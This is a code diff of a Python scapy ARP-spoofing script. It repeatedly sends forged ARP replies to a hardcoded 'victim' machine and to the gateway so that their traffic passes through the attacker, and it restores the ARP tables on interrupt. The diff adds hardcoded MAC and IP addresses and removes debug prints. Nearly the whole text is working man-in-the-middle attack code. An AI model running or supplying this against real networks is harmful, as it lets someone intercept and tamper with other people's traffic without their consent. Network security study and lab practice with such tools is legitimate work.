@@ -1,5 +1,16 @@
 import scapy.all as scapy
 import time
+import argparse
+import sys
+
+# targetIP: is Ip address of victim machine(10.0.2.4)
+# destinationMac: is Mac address of victim machine
+# spoofIP: is gatewayIP
+# op=2: represents the ARP packet is a response packet
+
+
+destinationMac = '14-10-9F-E1-65-61'
+sourceMAC = '0C-9D-92-82-9F-26'
 
 
 def get_mac(ip):
@@ -10,36 +21,29 @@ def get_mac(ip):
     return answered_list[1].hwsrc
 
 
-def spoof(target_ip, spoof_ip):
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip),
-                       psrc=spoof_ip)
+def spoofer(targetIP, spoofIP):
+    packet = scapy.ARP(op=2, pdst=targetIP, hwdst=destinationMac, psrc=spoofIP)
     scapy.send(packet, verbose=False)
 
 
-def restore(destination_ip, source_ip):
-    destination_mac = get_mac(destination_ip)
-    source_mac = get_mac(source_ip)
-    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
-    scapy.send(packet, verbose=False)
+def restore(destinationIP, sourceIP):
+    packet = scapy.ARP(op=2, pdst=destinationIP, hwdst=get_mac(destinationIP), psrc=sourceIP, hwsrc=sourceMAC)
+    scapy.send(packet, count=4, verbose=False)
 
-print("hi1")
-target_ip = "10.0.2.5"  # Enter your target IP
-gateway_ip = "10.0.2.1"  # Enter your gateway's IP
-print("hi2")
+
+targetIP = '192.168.1.34'
+gatewayIP = '192.168.1.1'
+
+packets = 0
 try:
-    print("hi3")
-    sent_packets_count = 0
     while True:
-        print("hi4") # i get 2 here
-        spoof(target_ip, gateway_ip)
-        spoof(gateway_ip, target_ip)
-        sent_packets_count = sent_packets_count + 2
-        print("\r[*] Packets Sent " + str(sent_packets_count), end="")
-        time.sleep(2)  # Waits for two seconds
-        print("hi5")
-
+        spoofer(targetIP, gatewayIP)
+        spoofer(gatewayIP, targetIP)
+        print("\r[+] Sent packets " + str(packets)),
+        sys.stdout.flush()
+        packets += 2
+        time.sleep(2)
 except KeyboardInterrupt:
-    print("\nCtrl + C pressed.............Exiting")
-    restore(gateway_ip, target_ip)
-    restore(target_ip, gateway_ip)
-    print("[+] Arp Spoof Stopped")
+    print("\nInterrupted Spoofing found CTRL + C------------ Restoring to normal state..")
+    restore(targetIP, gatewayIP)
+    restore(gatewayIP, targetIP)
